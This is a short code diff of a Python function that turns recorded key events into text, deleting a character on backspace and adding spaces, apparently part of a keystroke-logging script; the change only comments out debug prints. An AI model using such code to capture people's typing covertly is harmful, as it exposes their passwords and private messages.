@@ -30,11 +30,11 @@ def write_file(keys):
 
     data_str = ''
     for key in keys:
-        print(data_str)
+        # print(data_str)
         k = str(key).replace("'","")
 
         if k.find('backspace') > 0:
-                print('back')
+                # print('back')
                 data_str = data_str[:-1]
         if k.find('space') > 0:
                 data_str += ' '
